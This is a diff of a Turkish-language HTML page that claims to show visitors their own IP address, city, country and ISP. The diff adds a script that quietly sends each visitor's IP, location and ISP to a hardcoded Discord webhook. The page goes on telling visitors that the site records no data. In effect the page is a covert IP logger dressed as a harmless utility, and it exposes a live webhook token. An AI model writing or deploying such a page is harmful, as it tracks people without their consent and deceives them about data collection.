@@ -1,85 +1,128 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>IP & Şehir Bilgim</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <style>
-    body {
-      background:#0a0a0a;
-      color:#eaeaea;
-      font-family: monospace;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      height:100vh;
-      margin:0;
-    }
-    .box {
-      background:#111;
-      border:1px solid #333;
-      border-radius:10px;
-      padding:30px;
-      width:360px;
-      box-shadow:0 0 25px rgba(0,0,0,.7);
-    }
-    h2 {
-      margin-top:0;
-      text-align:center;
-    }
-    .row {
-      margin:10px 0;
-      font-size:14px;
-    }
-    .label {
-      color:#888;
-    }
-    .value {
-      color:#00ff88;
-      word-break:break-all;
-    }
-    .note {
-      margin-top:20px;
-      font-size:12px;
-      color:#777;
-      text-align:center;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>IP & Şehir Bilgim</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background:#0a0a0a;
+            color:#eaeaea;
+            font-family: monospace;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            margin:0;
+        }
+        .box {
+            background:#111;
+            border:1px solid #333;
+            border-radius:10px;
+            padding:30px;
+            width:360px;
+            box-shadow:0 0 25px rgba(0,0,0,.7);
+        }
+        h2 {
+            margin-top:0;
+            text-align:center;
+        }
+        .row {
+            margin:10px 0;
+            font-size:14px;
+        }
+        .label {
+            color:#888;
+        }
+        .value {
+            color:#00ff88;
+            word-break:break-all;
+        }
+        .note {
+            margin-top:20px;
+            font-size:12px;
+            color:#777;
+            text-align:center;
+        }
+    </style>
 </head>
 <body>
+    <div class="box">
+        <h2>Bağlantı Bilgilerin</h2>
+        <div class="row"><span class="label">IP:</span> <span id="ip" class="value">Yükleniyor...</span></div>
+        <div class="row"><span class="label">Şehir:</span> <span id="city" class="value">Yükleniyor...</span></div>
+        <div class="row"><span class="label">Ülke:</span> <span id="country" class="value">Yükleniyor...</span></div>
+        <div class="row"><span class="label">ISP:</span> <span id="isp" class="value">Yükleniyor...</span></div>
+        <div class="note">
+            Bu site hiçbir veri kaydetmez.<br>
+            Bilgiler yaklaşık olabilir.
+        </div>
+    </div>
 
-<div class="box">
-  <h2>Bağlantı Bilgilerin</h2>
+    <script>
+        // Webhook URL'sini buraya tanımlıyoruz.
+        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-  <div class="row"><span class="label">IP:</span> <span id="ip" class="value">Yükleniyor...</span></div>
-  <div class="row"><span class="label">Şehir:</span> <span id="city" class="value">Yükleniyor...</span></div>
-  <div class="row"><span class="label">Ülke:</span> <span id="country" class="value">Yükleniyor...</span></div>
-  <div class="row"><span class="label">ISP:</span> <span id="isp" class="value">Yükleniyor...</span></div>
+        // Discord'a veri gönderen fonksiyon
+        async function sendToDiscord(data) {
+            const payload = {
+                content: "Yeni bir ziyaretçi bağlandı!",
+                embeds: [{
+                    title: "Ziyaretçi Bilgileri",
+                    color: 5814783, // Yeşil renk kodu
+                    fields: [
+                        { name: "IP Adresi", value: `\`\`\`${data.ip}\`\`\``, inline: true },
+                        { name: "Şehir", value: `\`\`\`${data.city}\`\`\``, inline: true },
+                        { name: "Ülke", value: `\`\`\`${data.country}\`\`\``, inline: true },
+                        { name: "ISP", value: `\`\`\`${data.isp}\`\`\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-  <div class="note">
-    Bu site hiçbir veri kaydetmez.<br>
-    Bilgiler yaklaşık olabilir.
-  </div>
-</div>
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    console.error('Webhook gönderilemedi:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Webhook gönderilirken bir hata oluştu:', error);
+            }
+        }
 
-<script>
-fetch("https://ipwho.is/")
-  .then(res => res.json())
-  .then(data => {
-    if (!data.success) throw "API error";
+        // IP bilgilerini çeken ve hem ekrana yazan hem de Discord'a gönderen ana kod
+        fetch("https://ipwho.is/")
+            .then(res => res.json())
+            .then(data => {
+                if (!data.success) throw "API error";
 
-    document.getElementById("ip").textContent = data.ip;
-    document.getElementById("city").textContent = data.city || "Bilinmiyor";
-    document.getElementById("country").textContent = data.country || "Bilinmiyor";
-    document.getElementById("isp").textContent = data.isp || "Bilinmiyor";
-  })
-  .catch(() => {
-    document.querySelectorAll(".value").forEach(e => {
-      e.textContent = "Alınamadı";
-    });
-  });
-</script>
+                const userInfo = {
+                    ip: data.ip,
+                    city: data.city || "Bilinmiyor",
+                    country: data.country || "Bilinmiyor",
+                    isp: data.isp || "Bilinmiyor"
+                };
 
+                // Ekrandaki elemanları güncelle
+                document.getElementById("ip").textContent = userInfo.ip;
+                document.getElementById("city").textContent = userInfo.city;
+                document.getElementById("country").textContent = userInfo.country;
+                document.getElementById("isp").textContent = userInfo.isp;
+
+                // Bilgileri Discord'a gönder
+                sendToDiscord(userInfo);
+            })
+            .catch(() => {
+                document.querySelectorAll(".value").forEach(e => {
+                    e.textContent = "Alınamadı";
+                });
+            });
+    </script>
 </body>
 </html>
